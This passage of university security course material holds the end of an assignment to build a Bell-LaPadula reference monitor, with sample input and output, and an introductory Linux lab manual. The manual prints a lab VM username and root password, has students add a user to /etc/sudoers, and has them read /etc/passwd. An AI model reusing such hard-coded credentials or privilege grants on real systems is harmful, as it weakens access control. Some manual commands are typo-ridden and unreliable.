(i.e., reference monitor) and cannot be changed after they are created (i.e., they have strong tranquility). Essentially, the reference monitor will manage the two mappings from the subject and object names to their security levels. In our secure system, whenever a subject requests to perform a syntactically legal action (i.e., READ or WRITE), the parsed instruction object is submitted to the reference monitor, which decides whether to perform the action or not based on the BLP properties (i.e., the simple security and the *-property). If the instruction is both syntactically legal and is allowed by the BLP rules, the reference monitor indicates that access is granted and then calls the applicable target (i.e., the Subject object and/or Object object) to perform the appropriate operation. Otherwise, the reference monitor indicates that access is denied and prints the instruction object, but no objects are accessed. Additionally, we extend the notion of a Bad Instruction to be a syntactically legal instruction that references a subject or object that does not exist, though this can be passed to the reference monitor to make that determination. All syntactically legal subject and object accesses MUST go through the reference monitor. If the subject is performing a READ, it then stores this value (from the object) to its integer variable. Think of the reference monitor as a firewall around the subjects and objects. The subjects and objects themselves donâ€™t care about security levels. They just do what the reference monitor tells them through simple accesses, so any security levels must be in the reference monitor, not in the Subject or Object objects themselves. You should have methods such as addSubject(), addObject(), executeRead(), executeWrite(), and printState() within your RefMon class that checks access requests and performs the appropriate action (if any) on the targetâ€™s state, following the instruction semantics outlined above. CSCE 3550 Foundations of Cybersecurity Spring 2022 3 The main part of your program should manage the reference monitor and also serve as the command interpreter. It should read successive instructions from the instruction list file, parse them, and submit syntactically legal commands to the reference monitor for verification. Your task is to implement this secure system, subject to the following constraints: â€¢ The SecurityLevel should be defined as LOW, MEDIUM, and HIGH with a â€œdominatesâ€ relation. You may assume that levels are linearly ordered. That is, it is a total order so you do not need to worry about categories. â€¢ When you parse a command from the input file, for any syntactically legal command you will create an instruction object with fields representing the instruction type (i.e., ADDSUB, ADDOBJ, READ or WRITE), the subjectâ€™s name, the objectâ€™s name, and value, if any. It is this instruction object that you pass to the RefMon object. For an ill-formed instruction, you can simply indicate that it is a bad instruction and print out the command without sending to the reference monitor. Note that the STATUS command is not subject to this requirement. The STATUS command will call a method in RefMon that prints out the names, security levels, and current values of all the subjects and objects. Additionally, you will â€œinternallyâ€ invoke the STATUS command after the final instruction has been executed to print out the final state of the subjects and objects in the secure system. Note, however, that this kind of information is not something that typically a secure system would do, but it is being asked for here in the context of the assignment. To ensure that your code is correctly compiled and/or executed, please include a README file with any important compiling/running instructions, such as using a makefile or any required compile options like libraries and flags, for the TA. Your program will be tested using a suite of 3 â€“ 5 input files on the Linux CSE machines, some of which will exercise your programâ€™s ability to correctly execute commands and some of which will test your programâ€™s ability to catch error conditions. You should not â€œhard-codeâ€ any items in your system. Be sure that you thoroughly exercise your programâ€™s capabilities on a wide range of test suites. REQUIREMENTS: â€¢ Your code should be well documented in terms of comments. For example, good comments in general consist of a header (with your name, course section, date, and a brief description), comments for each variable, and commented â€œblocksâ€ of code. â€¢ Even though it is stated above, two following requirements must be explicitly adhered to or result in significant points being deducted: o All subjects and objects MUST be implemented as classes and instantiated as actual objects, not just an entry in an array, etc. o The security labels must be contained and managed by the reference monitor and be SEPARATE from the actual Subject/Object object. I.e., the Subject and Object class/object must only contain name and value, not security level. CSCE 3550 Foundations of Cybersecurity Spring 2022 4 â€¢ Your program will be graded largely on whether it works correctly on the CSE machines (e.g., cse01, cse02, â€¦, cse06), so you should make sure that your program compiles and runs on a CSE machine. â€¢ Please pay attention to the SAMPLE OUTPUT for how this program is expected to work. If you have any questions about this, please contact your instructor, TA, or IA assigned to this course to ensure you understand these directions. â€¢ This is an individual programming assignment that must be the sole work of the individual student. Any instance of academic dishonesty will result in a grade of â€œFâ€ for the course, along with a report filed into the Academic Integrity Database. SAMPLE OUTPUT (user input shown in bold): Although I have used 7 alphanumeric characters for both subjects and objects in my instruction list for this sample output, there is no restriction to the length of the subject or object names. $ more instrList addsub kel0004 LOW addsub jms0381 MEDIUM addsub sam0039 HIGH addobj file001 MEDIUM addobj file002 LOW status write kel0004 file002 20 write jms0381 file001 10 status 10 status read sam0039 file001 read kel0004 file001 read kel0004 file002 addobj file003 HIGH status write jms0381 file002 read sam0039 write jms0381 file001 40 80 read krt1039 file003 50 write kel0004 file001 10 status addsub sra0002 LOW read sra0002 file003 addsub krt0084 MEDIUM addsub liz0028 HIGH status write krt1039 file004 40 write liz0028 file001 20 write liz0028 file003 30 read sra0002 file002 status addobj file004 HIGH addobj file005 LOW read liz0028 file005 write sra0002 file005 50 status addobj file006 MEDIUM write jms0381 file006 30 CSCE 3550 Foundations of Cybersecurity Spring 2022 5 write kel0004 file006 20 status read liz0028 file003 read krt1039 file004 read jms0381 file004 read krt0084 file001 read krt0084 file005 status write sam0039 file006 90 write sam0039 file005 x write liz0028 file004 60 write liz0028 file005 60 status read sra0002 file007 exec adm0831 file004 read sam0039 file006 read jms0381 file005 write sra0002 file004 70 $ make clean rm *.o secureblp $ make g++ -c -g -std=c++0x -Wall -c -o Subject.o Subject.cpp g++ -c -g -std=c++0x -Wall -c -o Object.o Object.cpp g++ -c -g -std=c++0x -Wall secureBLP.cpp g++ -c -g -std=c++0x -Wall -c -o RefMon.o RefMon.cpp g++ -o secureblp Subject.o Object.o secureBLP.o RefMon.o $ ./secureblp usage: secureblp instructionList $ ./secureblp badfile Unable to open badfile file. Terminating... $ ./secureblp instrList Subject Added : addsub kel0004 LOW Subject Added : addsub jms0381 MEDIUM Subject Added : addsub sam0039 HIGH Object Added : addobj file001 MEDIUM Object Added : addobj file002 LOW +--------current state--------+ |-subject-|--level--|--value--| | kel0004 | LOW | 0 | | jms0381 | MEDIUM | 0 | | sam0039 | HIGH | 0 | |--object-|--level--|--value--| | file001 | MEDIUM | 0 | | file002 | LOW | 0 | +-----------------------------+ Access Granted : kel0004 writes value 20 to file002 Access Granted : jms0381 writes value 10 to file001 Bad Instruction : status 10 +--------current state--------+ |-subject-|--level--|--value--| | kel0004 | LOW | 0 | | jms0381 | MEDIUM | 0 | | sam0039 | HIGH | 0 | |--object-|--level--|--value--| | file001 | MEDIUM | 10 | | file002 | LOW | 20 | +-----------------------------+ CSCE 3550 Foundations of Cybersecurity Spring 2022 6 Access Granted : sam0039 reads file001 Access Denied : read kel0004 file001 Access Granted : kel0004 reads file002 Object Added : addobj file003 HIGH +--------current state--------+ |-subject-|--level--|--value--| | kel0004 | LOW | 20 | | jms0381 | MEDIUM | 0 | | sam0039 | HIGH | 10 | |--object-|--level--|--value--| | file001 | MEDIUM | 10 | | file002 | LOW | 20 | | file003 | HIGH | 0 | +-----------------------------+ Bad Instruction : write jms0381 file002 Bad Instruction : read sam0039 Bad Instruction : write jms0381 file001 40 80 Bad Instruction : read krt1039 file003 50 Access Granted : kel0004 writes value 10 to file001 +--------current state--------+ |-subject-|--level--|--value--| | kel0004 | LOW | 20 | | jms0381 | MEDIUM | 0 | | sam0039 | HIGH | 10 | |--object-|--level--|--value--| | file001 | MEDIUM | 10 | | file002 | LOW | 20 | | file003 | HIGH | 0 | +-----------------------------+ Subject Added : addsub sra0002 LOW Access Denied : read sra0002 file003 Subject Added : addsub krt0084 MEDIUM Subject Added : addsub liz0028 HIGH +--------current state--------+ |-subject-|--level--|--value--| | kel0004 | LOW | 20 | | jms0381 | MEDIUM | 0 | | sam0039 | HIGH | 10 | | sra0002 | LOW | 0 | | krt0084 | MEDIUM | 0 | | liz0028 | HIGH | 0 | |--object-|--level--|--value--| | file001 | MEDIUM | 10 | | file002 | LOW | 20 | | file003 | HIGH | 0 | +-----------------------------+ Bad Instruction : write krt1039 file004 40 Access Denied : write liz0028 file001 20 Access Granted : liz0028 writes value 30 to file003 Access Granted : sra0002 reads file002 +--------current state--------+ |-subject-|--level--|--value--| | kel0004 | LOW | 20 | | jms0381 | MEDIUM | 0 | | sam0039 | HIGH | 10 | | sra0002 | LOW | 20 | | krt0084 | MEDIUM | 0 | CSCE 3550 Foundations of Cybersecurity Spring 2022 7 | liz0028 | HIGH | 0 | |--object-|--level--|--value--| | file001 | MEDIUM | 10 | | file002 | LOW | 20 | | file003 | HIGH | 30 | +-----------------------------+ Object Added : addobj file004 HIGH Object Added : addobj file005 LOW Access Granted : liz0028 reads file005 Access Granted : sra0002 writes value 50 to file005 +--------current state--------+ |-subject-|--level--|--value--| | kel0004 | LOW | 20 | | jms0381 | MEDIUM | 0 | | sam0039 | HIGH | 10 | | sra0002 | LOW | 20 | | krt0084 | MEDIUM | 0 | | liz0028 | HIGH | 0 | |--object-|--level--|--value--| | file001 | MEDIUM | 10 | | file002 | LOW | 20 | | file003 | HIGH | 30 | | file004 | HIGH | 0 | | file005 | LOW | 50 | +-----------------------------+ Object Added : addobj file006 MEDIUM Access Granted : jms0381 writes value 30 to file006 Access Granted : kel0004 writes value 20 to file006 +--------current state--------+ |-subject-|--level--|--value--| | kel0004 | LOW | 20 | | jms0381 | MEDIUM | 0 | | sam0039 | HIGH | 10 | | sra0002 | LOW | 20 | | krt0084 | MEDIUM | 0 | | liz0028 | HIGH | 0 | |--object-|--level--|--value--| | file001 | MEDIUM | 10 | | file002 | LOW | 20 | | file003 | HIGH | 30 | | file004 | HIGH | 0 | | file005 | LOW | 50 | | file006 | MEDIUM | 20 | +-----------------------------+ Access Granted : liz0028 reads file003 Bad Instruction : read krt1039 file004 Access Denied : read jms0381 file004 Access Granted : krt0084 reads file001 Access Granted : krt0084 reads file005 +--------current state--------+ |-subject-|--level--|--value--| | kel0004 | LOW | 20 | | jms0381 | MEDIUM | 0 | | sam0039 | HIGH | 10 | | sra0002 | LOW | 20 | | krt0084 | MEDIUM | 50 | | liz0028 | HIGH | 30 | CSCE 3550 Foundations of Cybersecurity Spring 2022 8 |--object-|--level--|--value--| | file001 | MEDIUM | 10 | | file002 | LOW | 20 | | file003 | HIGH | 30 | | file004 | HIGH | 0 | | file005 | LOW | 50 | | file006 | MEDIUM | 20 | +-----------------------------+ Access Denied : write sam0039 file006 90 Bad Instruction : write sam0039 file005 x Access Granted : liz0028 writes value 60 to file004 Access Denied : write liz0028 file005 60 +--------current state--------+ |-subject-|--level--|--value--| | kel0004 | LOW | 20 | | jms0381 | MEDIUM | 0 | | sam0039 | HIGH | 10 | | sra0002 | LOW | 20 | | krt0084 | MEDIUM | 50 | | liz0028 | HIGH | 30 | |--object-|--level--|--value--| | file001 | MEDIUM | 10 | | file002 | LOW | 20 | | file003 | HIGH | 30 | | file004 | HIGH | 60 | | file005 | LOW | 50 | | file006 | MEDIUM | 20 | +-----------------------------+ Bad Instruction : read sra0002 file007 Bad Instruction : exec adm0831 file004 Access Granted : sam0039 reads file006 Access Granted : jms0381 reads file005 Access Granted : sra0002 writes value 70 to file004 +---------final state---------+ |-subject-|--level--|--value--| | kel0004 | LOW | 20 | | jms0381 | MEDIUM | 50 | | sam0039 | HIGH | 20 | | sra0002 | LOW | 20 | | krt0084 | MEDIUM | 50 | | liz0028 | HIGH | 30 | |--object-|--level--|--value--| | file001 | MEDIUM | 10 | | file002 | LOW | 20 | | file003 | HIGH | 30 | | file004 | HIGH | 70 | | file005 | LOW | 50 | | file006 | MEDIUM | 20 | +-----------------------------+ SUBMISSION: â€¢ You will electronically submit all of your source code files, makefile, if applicable, plus a README file with any important compiling/running instructions for the TA to the Project 1 dropbox in Canvas by the due date."
INTRO TO COMPUTER SECURITY,5550,Security Lab,"Security Lab Student Name: Table of Contents 1. An Overview of Linux 2. Kali Linux-Intro 3. Linux Terminal-Intro 4. User Account Management 5. Usage of Some Basic Commands 6. File Permissions and Access Control 7. Installing Software 8. Text Editors - Nano & Vim 9. List of Useful Commands SECURITY LAB - [SELECT DATE] 2 An Overview of Linux A typical Linux operating system is made up of three parts: the kernel, the shell and the applications. Kernel: The kernel of Linux is the hub of the operating system: it allocates time and memory to programs and handles the file storage as well as response to system calls. Shell: The shell acts as an interface between the user and the kernel. When a user logs in (into command line only environment), the login program checks the username and password, and then starts another program called the shell. The shell is a command line interpreter (CLI). It interprets the commands, which are typed by the user, and it arranges for them to be carried out. The commands are themselves programs: when they terminate, the shell gives the user another prompt. A graphical user interface for the shell is called Terminal. Desktop Environment: Linux operating systems also have a graphical user interface (GUI) through which users can access applications and system resources. Unlike other operating systems Linux OS has many Desktop Environments available. Users are free to install the GUI of their choice. Some popular ones are GNOME, KDE, XFCE, Ubuntu Unity, etc. When one installs a Linux system, it comes with a default GUI. One can install other GUIs at any time, but only one GUI environment can be used at a time. For example, Kali Linux comes with GNOME. Linux Directory Structure: In Linux, files and directories (folders) are laid out on disk in hierarchical fashion in a tree structure. The top directory is called root folder, it is denoted by â€œ/â€ (slash). A collection of all files and directories in a Linux machine is referred to as a â€œfilesystemâ€. A path (location) of a file or directory in the filesystem is written starting from the root directory (/) followed by all intermediate directory names, which are separated by a slash with the actual file name (or directory name) in the end of the path. Example: the file path of the file â€œreport.docâ€ in the above figure is written as /home/its/ug1/ee51vn/report.doc SECURITY LAB - [SELECT DATE] 3 Notes: 1. In the path /home/its/ug1/ee51vn/report.doc, do not get confused between first slash / which denotes the root directory and subsequent slashes, which are used to separate directories at each level of the path. 2. There are no spaces in a file path. Example: The file path â€œ/home/its/ug1/ee51vn/report.docâ€ is the one single string with no spaces between slashes and subsequent folder names. Question 1: Write the path for directory staff in above figure. Different default directories under the / directory are used for some specfic purposes. /bin : All executable binary files (including commands) are present in this directory. /dev : Contains device files for hardware devices (usb, cdrom etc.) /etc : Contains applicationâ€™s configuration files, startup, shutdown, start, stop script for every individual program. /home : Home directory of the users. Every time a new user is created, a directory with the corresponding username is created within /home which contains other directories such as Desktop, Downloads, Documents, etc. /lib : Contains the kernel modules and shared library images required to boot the system and run commands in the root file system. /lost+found : This directory is created during installation of Linux, useful for recovering files which may be broken due to unexpected shutdown. /media : Temporary mount directory is created for removable devices viz., media/cdrom. /mnt : Temporary mount directory for mounting file system. /opt : Contains the third-party application software viz. Java, etc. /proc : A virtual and pseudo filesystem which contains information about running processes with a particular process id abbreviated as â€œpidâ€. Introduction to Linux There exist many Linux OS distributions (around 3500 are known), but most of them are created from the same Linux kernel. We will use Ubuntu and Kali Linux for most of the labs in this course. Kali is mainly used for computer security and digital forensics applications. Other popular Linux variants are Redhat, Debian, and CentOS. The purpose of this lab is a quick introduction to working with VirtualBox and Linux. No report needs to be submitted for this lab (no grading and no credit), so no need to take screenshots and answer questions, as requested in the manual. Nonetheless, you are expected to be familiar with the material covered in this lab. Note that some of the screenshots shown in this manual may be outdated (as they may come from earlier versions of the software). In this lab, you will be using the Ubuntu 20 VM. The credentials are: Username: sec-lab Password: untccdc SECURITY LAB - [SELECT DATE] 4 If the OS doesnâ€™t start, select in the menu the Machine option and press Settings. Go to the Network section and change a value in the field â€œAttachedâ€ to â€œNATâ€ Press Ok button and go again to the Machine option and press Reset. This is how the default desktop environment on a Ubuntu Desktop OS looks like. On the left there is menu bar: Dash Home, Home folder, FireFox Browser, Stytem Settings, and workspaces 1. To Open Terminal: Click on Dash Home and write â€œterminalâ€ in the searching. Click in the â€œTerminalâ€ icon. 2. To Open Web Browser: Click on the FireFox Browser 3. To Open Text Editors: Click on Dash Home and write â€œeditâ€ in the searching. Click in the â€œText Editorâ€ icon 4. To Open File System: Click in Home folder SECURITY LAB - [SELECT DATE] 5 Linux Terminal -Intro 1. Open Terminal by clicking on Dash Home and write â€œterminalâ€ in the searching. Click in the â€œTerminalâ€ icon. 2. You will see a Terminal window like this one: The text sec-lab@ubuntu:~# is the shell prompt. It means user sec-lab, is logged into machine ubuntu. I used sec-lab as my system name. # indicates super user root. For normal user it is the $ symbol. For a normal user bob, the prompt looks like: bob@ubuntu:~$ The ~ (tilde) symbol indicates that the user is currently in his home directory. For the root user the home directory is /root. For the user â€œsec-labâ€ the home directory would be /home/sec-lab. In later sections Iâ€™ll explain the difference between a super user root and a normal user. Linux Command Format: A typical linux command has 3 parts: command, options and arguments. Options starts with â€œ-â€œ symbol (hyphen or minus symbol). There are always spaces in between command, option and arguments Ex: â€œls -l /homeâ€. In this â€œlsâ€ is command, â€œâ€“lâ€ is option, â€œ/homeâ€ is argument. This command lists all file and folders in the folder /home. Note that there are always spaces in between command, arguments and options. You have to type this command in this way: ls<space>-l<space>/home. Notes: a. To separate commands from normal text I used double quotes but when you are typing commands in shell do it without quotes. DO NOT USE QUOTES. In every tutorial (on line tutorials or Text Books) it is customary to use some kind of text scheme to separate command from explanation. By end of the lab youâ€™ll be able to differential between a normal text and a Linux command. SECURITY LAB - [SELECT DATE] 6 b. The italic part in command is a sample name â€“ you have to use the actual name according to your environment. For example if I asked you to type â€œ/home/usernameâ€, if your username is â€œbobâ€ you have to type /home/bob. c. All Commands in Linux are case sensitive: pwd and Pwd are not same. User Account Management 1. Creating a new user account for you: a. Type â€œsudo suâ€. The system will ask for the root password, which is â€œuntccdcâ€, so type it. The shell prompt will change to # and now you are working as a root. b. Type â€œadduser usernameâ€. Give a desired one in place of username. In the below screenshot, this username is alice. c. Enter a password for your account. You have to do it twice. Note: Passwords are not shown in terminal as you type them. Usually while typing password, you will see ***** (stars) or â€¦â€¦â€¦ (dots). But now, you do not see anything on the Linux Terminal. d. Add further user details. These details are optional, so you can just hit enter to skip Full Name, Number, Phone, and other data â€“ see the below screenshot. e. Type â€œyâ€ at â€œIs this information correct?â€ 2. To change any user password use passwd command. Example: passwd alice 3. Add new user to sudoers file to give this user the superuser permissions. SECURITY LAB - [SELECT DATE] 7 a. Type â€œnano /etc/sudoersâ€. (nano is a command line text editor, it is explained in detail in Text Editors section of this Lab document). b. In that file, add the following line: Username ALL=(ALL:ALL) ALL. It should be added next to the following one: root ALL=(ALL:ALL) ALL. In the below example, the username is alice. You have to give your newly created username. c. Press Control+O, Enter, when asked for confirmation, press Control+X to exit. 4. Close the terminal window. 5. Restart. Go to the upper menu and press in the right corner icon and Shut Down. In the new window press the Restart button. 6. Login with your new user. Question 2: Login to your new user account, open a terminal and type â€œsudo suâ€, enter sudo password for your account, and submit a screenshot. The screenshot should clearly show the prompt. It looks like root@ubuntu:/home/alice. 7. Create another user from your account. a. Open Terminal after logging into your account. b. Type â€œsudo adduser bobâ€. Enter sudo password for your account. Note: the user password is asked when you use the â€œsudoâ€ command for first time in a terminal. The command â€œsudoâ€ is used to elevate a normal user to the root user for execution of some high-privilege commands. c. Add a (unix) password for new user bob twice and complete the rest of the details as done earlier. SECURITY LAB - [SELECT DATE] 8 8. To change to the root user from the ordinary user: a. Type â€œsudo su â€“â€ . b. Type the root user password at the prompt. After successful login, you should observe a change in shell prompt from your current user to the root user. c. Type â€œexitâ€ to exit from the root user. Now, you should be back to your normal user prompt. Question 3: Type â€œtail /etc/passwdâ€ (/etc/password is one string, it should not contain spaces.) Submit a screenshot of this step. The root user (also called the superuser) is an administrator of system who has full privileges by default, while an ordinary user has limited privileges. An ordinary user needs to use â€œsudoâ€ command to be able to run certain high-privilege commands, temporarily. Example: to install software, to change to the root user in terminal, to change the system settings, etc. Usage of Some Basic Commands: Files and Directories 9. pwd - present working directory Type â€œpwdâ€ in the command prompt (without quotes). This command displays the current directory. When a user starts the shell, the default directory is userâ€™s home directory: /home/username. (Here, username is your login name used when logging into the VM). SECURITY LAB - [SELECT DATE] 9 10. cd â€“ change directory This command is used to change to a desired directory from the current directory. a. Type â€œcd /homeâ€ (without quotes). This will move the user to the /home directory. b. Type â€œpwdâ€. Confirm that you are in /home. c. Type â€œcd -â€. This will take you back to previous directory, i.e., your home directory. d. You can use â€œcd ~â€ to go back to your home directory from anywhere. (~ tilde symbol) e. The symbol â€œ.â€ (a single dot) refers to the current directory, â€œ..â€ (double dots) refers to the parent directory. â€œcd .â€ keeps you in same directory, while â€œcd ..â€ moves you to the parent directory, which is one level up in the directory tree. Correspondingly, â€œcd ../..â€ moves you two levels up, with respect to the current directory. 11. ls â€“ list ls command simply lists file and directories in the present directory. An option â€œâ€“lâ€ gives a more detailed information, which includes, e.g., file sizes, time of creation, permissions, and other. a. Type â€œls â€“lâ€ to display details of a directory or file: ls â€“l directory or file name. Example: ls â€“l Desktop b. Type â€œls â€“laâ€. Question 4: what output â€œls â€“laâ€ gives (take a screenshot)? What difference did you observe between the results of ls â€“l and ls â€“la? What is option â€œâ€“aâ€ means (Hint: refer to man page: â€œman lsâ€ â€“ see the man help section below â€“ or just do the Internet search.) 12. mkdir - to create a directories. a. Type â€œmkdir firstdirâ€. It creates a new directory called firstdir. You can also create multiple directories and also nested directories. b. Type â€œmkdir dir1 dir2 dir3.â€ It creates 3 directories in the present directory. c. Type â€œmkdir â€“p dir11/dir22/{dir33, dir44}â€. It creates 4 directories: dir11, dir22 inside dir11, as well as dir33 and dir44 inside dir22. d. Type â€œ lsâ€. 13. rm - delete a file or directory. â€¢ type â€œrm â€“r dir3â€. You can also use â€œrmdirâ€ but it only deletes empty directories. 14. touch - to create empty files. â€¢ type â€œtouch file1 file2 file3â€. 15. mv - to move or rename files and directories. a. type mv file1 dir1. This moves (cuts and pastes) the file file1 to the directory dir1. b. type mv file2 file22. c. Type â€œlsâ€. 16. cp - copy files and directories. Type the following commands in the below order. â€œtouch file4â€ - creates a file file4. â€œmkdir dir4â€ - creates a directory dir4. â€œcp file4 dir4â€ - copies file4 to dir4. â€œmkdir dir5â€ - creates another directory dir5. SECURITY LAB - [SELECT DATE] 10 â€œcp â€“r dir4 dir5â€ .Copies dir4 to dir5 Question 5: Why do we have to use â€œ-râ€ option to copy directories (Hint use man cp)? 17. find- to find files and directories. â€¢ Type â€œfind /root â€“name file1.â€ Question 6: What is the result? You are searching for file called file1 in directory /root. This command will search for the file in /root and in all its sub directories. You gave /root as search location as you think file1 must be somewhere in it. You are totally clueless where the might be on file system, you should start searching for it from top most directory in file-system, i.e /. the command would be find / -name file1 Absolute and relative path 18. The absolute path of a file or directory is its path written from the root of the file system. For example, consider the directory dir44 you created earlier in Step 5. Its absolute path is /home/username/dir11/dir22/dir44. 19. Relative path of file or directory is its path from the current directory. Now you are in your home directory which is /home/username. The relative path of dir44 from this directory is dir11/dir22/dir44. You start writing relative path from directory directly below i.e. dir11 20. You can a file or directory either using relative path or absolute path â€¢ Type â€œtouch /home/username/dir11/dir22/dir44/file44â€.(Replace username you actual username). â€¢ Type â€œdir11dir22/dir44/file55â€ Either way you are able can access dir44 Note: Relative path only makes sense if the object you are accessing below your current directory. Else you have to use the Absolute path. For example, you have to access /etc/wireshark/init.lua file, you donâ€™t have any relative path to it from your home directory. But you can use a relative path you are in / or /etc. File Compression and archiving 21. To compress and archive files: In Linux file compression and archiving (grouping file together) and compression are two different activities. First, we archive multiple files with â€œtarâ€ command. A file with â€œ.tarâ€ extension is created. Then we zip (compress the file) with gzip command. (gzip-stands for gunzip is compression tool in linux. Bunzip (bzip2) and zip are other commonly used compression tools) a. Type â€œtouch a b c dâ€. Creates 4 files a, b, c and d b. tar â€“cf compressed.tar a b c d. We are creating a tar file compressed.tar from files a b c and d SECURITY LAB - [SELECT DATE] 11 c. gzip â€“vf compressed.tar. This should create a file compressed.tar.gz Note: For â€œtarâ€ command, you should supply output filename along with .tar extension. For gzip, it automatically creates a zipped file with .gz extension. You no longer have .tar file after you compress it with gzip. d. You can also do it in single step which is usually the preferred way: type â€œtar â€“zcvf compressed2.tar.gz a b c dâ€. 22. To extract and uncompress files a. Type â€œrm â€“rf a b c dâ€. Deleting the files b. Type â€œlsâ€ c. Type â€œgzip â€“dvf compressed.tar.gzâ€-youâ€™ll get compressed.tar file d. Type â€œtar â€“xvf compessed.tarâ€. Youâ€™ll get original files a, b, c and d e. type â€œlsâ€ f. You can just uncompress and extract the compressed2.tar.gz in a sigle step: g. Type â€œtar â€“zxvf compressed2.tar.gzâ€ Getting help- the â€œmanâ€ command: â€œmanâ€ command is used to get help for any command in Linux. man stands for manual. To pull up a man page of a command, type man command. Ex: man ls. This command displays list of options available with the command. Man pages explain different options and syntax of a command and are usually difficult to understand for beginners. If you want to know usage and example for a command, google is the best place to look. Type â€œqâ€ to quit from man page. File Permissions and Access Control In Linux a file has read, write and execute permissions. And permissions are assigned to users of three categories: owner, group and others. The user who creates a file will be the owner, group is group of users who has access. Others are all the users other than owner and users in the group 1. Understanding file/directory permissions: Type ls â€“l filename to list file permissions. SECURITY LAB - [SELECT DATE] 12 Below illustration explains various fields of a file details printed Each file (and directory) has associated access rights, which may be found by typing ls -l. Also, ls -lg gives additional information as to which group owns the file (beng95 in the following example): -rwxrw-r-- 1 ee51ab beng95 2450 Sept29 11:52 file1 In the left-hand column is a 10 symbol string consisting of the symbols d, r, w, x, -, and, occasionally, s or S. If d is present, it will be at the left hand end of the string, and indicates a directory: otherwise - will be the starting symbol of the string. The 9 remaining symbols indicate the permissions, or access rights, and are taken as three groups of 3. â€¢ The left group of 3 gives the file permissions for the user that owns the file (or directory) (ee51ab in the above example); â€¢ the middle group gives the permissions for the group of people to whom the file (or directory) belongs (eebeng95 in the above example); For every user in Linux,a group with the same name is also created. This group will be default group on newly created files. â€¢ the rightmost group gives the permissions for all others. The symbols r, w, etc., have slightly different meanings depending on whether they refer to a simple file or to a directory. 2. Access rights on files. â€¢ r (or -), indicates read permission (or otherwise), that is, the presence or absence of permission to read and copy the file â€¢ w (or -), indicates write permission (or otherwise), that is, the permission (or otherwise) to change a file â€¢ x (or -), indicates execution permission (or otherwise), that is, the permission to execute a file, where appropriate SECURITY LAB - [SELECT DATE] 13 3. Access rights on directories. â€¢ r allows users to list files in the directory; â€¢ w means that users may delete files from the directory or move files into it; â€¢ x means the right to access files in the directory. This implies that you may read files in the directory provided you have read permission on the individual files. â€¢ So, in order to read a file, you must have executed permission on the directory containing that file, and hence on any directory containing that directory as a subdirectory, and so on, up the tree. Some examples -rwxrwxrwx a file that everyone can read, write and execute (and delete). -rw------- a file that only the owner can read and write - no-one else can read or write and no-one has execution rights (e.g. your mailbox file). 4. Changing access rights(permisions) on a file a. chmod (changing a file mode): i. Only the owner of a file can use chmod to change the permissions of a file. The options of chmod are as follows Symbol Meaning u user g group o other a all r read w write (and delete) x execute (and access directory) + add permission - take away permission ii. type â€œtouch accessâ€ (to create a file called access) iii. type â€œls â€“l accessâ€ iv. To remove read write and execute permissions on the file access for the group and others type â€œsudo chmod go-rwx accessâ€. This will leave the other permissions unaffected. v. To give read and write permissions on the file access to all, Type â€œsudo chmod a+rw accessâ€ b. chgrp-this command is used to change the group of a file i. Type â€œsudo chgrp bob accessâ€. This will change the default group on file â€œaccessâ€ to bob from your username. ii. Type â€œls â€“l accessâ€ SECURITY LAB - [SELECT DATE] 14 c. chown- this command is used change ownership of a file or directory. This can also be used to change the group like chgrp. i. Type â€œtouch own_fileâ€ ii. Type â€œls â€“l own_fileâ€ iii. Type â€œsudo chown bob own_fileâ€. This change owner of the file to bob from you. iv. Type â€œmkdir own_dirâ€ v. Type â€œls â€“ld own_dirâ€. The â€“ld option displays properties of directory. If you only use â€“l it shows properties of contents of own_dir. vi. Type â€œsudo chown bob:bob own_dirâ€ .This change both owner and group to bob on folder own_dir. vii. Type â€œls â€“ld own_dirâ€ Question 7: Submit a screen shot of terminal Note that chown only change owner of directory but not its contents. To change ownership of files and directories within own_dir, along with is permissions use chown with â€œâ€“Râ€ option. Ex: â€œsudo chown â€“R bob:bob own_dirâ€ Installing Software 1. To install a software package apt-get command is used in Ubuntu Linux. â€¢ Type â€œsudo apt-get updateâ€ â€¢ Type â€œsudo apt-get install chromiumâ€ (if this does not work, use â€œsudo apt-get install chromium-browserâ€.) It checks for file size to be downloaded and ask for confirmation. Type â€œyâ€ and hit enter. This command installs Chromium web browser. Question 8: Take a screenshot of the notification that installation is complete. If you donâ€™t know the exact name of the package you can search for it with â€œapt-cacheâ€ command Ex: apt-cache search openoffice. Relevant packages will be shown. 2. Installing software From GUI You can also install software using â€œAdd or Removeâ€ utility. Click Applications->Click System Tools->Select Add or Remove Software 3. To download a file from internet use wget command Type wget https://kekeseen.files.wordpress.com/2013/03/linux_commands_08.pdf This will down the pdf file. Similarly, you can down load file from web page if its URL is known. SECURITY LAB - [SELECT DATE] 15 Text Editors-Nano & Vim Nano: a. To open a file in nano: Type â€œnano newfileâ€. This will open a blank file called newfile. If there is already a file by name newfile nano will open that. Only if there exists no file by the name supplied it opens a new blank file with the supplied name. b. To edit and save To write data to file, move cursor with arrow keys to location where you want to add content and start writing. Delete content using backspace. Press Ctrl+O, it ask for confirmation: File name to write: newfile. Hit Enter. c. To exit nano Press Ctrl+X d. To search for a string or keyword Press Ctrl+W. A search: prompt appears at the bottom, type keyword you want to search and press enter. Note: You have all the above explained controls at the bottom of the nano editor with brief description 1. VI Editor: VI Editor has 2 different modes: Command Mode and Insert Mode. a. Command mode: Type: â€œvi blankfileâ€. This opens a new file-blank file if a file doesnâ€™t exist by the name. A file is opened into command mode by default. In this mode you can issue commands to edit text. b. Insert mode: Hit letter â€œiâ€, which moves to insert mode from command mode. You can edit, add content to the file in this mode. Use arrow keys to navigate, backspace to delete. To save changes to the file: SECURITY LAB - [SELECT DATE] 16 i. Press Escape key-it takes file back to command mode. ii. Press ""Shift + :â€ A : prompt is created at bottom of file. iii. Type letter â€œwâ€-it saves your file Note: If you donâ€™t want save the file at this point but want to go back , hit escape-to go to command mode and then â€œiâ€ to go to insert mode. You always have to be in command mode before you go to insert mode. iv. Again Press ""Shift + :â€- and type â€œqâ€ to exit vi editor. If file has unsaved modifications, vi asks for confirmation. Typing q! Forcefully quits without saving. c. More about Command mode: This mode takes commands from key board, to do operation like copy, paste, cut delete, etc. You can navigate using arrow keys. a. dd-delete current line (in which cursor is present). ndd â€“deletes n number of lines. Ex: 5dd b. yy-copy current line (in which cursor is present). nyy- copies n number of lines. c. p-paste copied line(s) below current line 2. To print content of text file to terminal a. Type â€œcat newfileâ€. It will dump all the content in newfile to terminal. b. Type â€œless newfileâ€. This will open newfile on terminal but only partially display its content. Press enter to browse the file one line at a time. Press Q to exit less. There are many other text editors like emacs, pico etc, but we limit our demonstration to nano and vi. There are many GUI test editors as well. Some of them are mentioned in the Kali 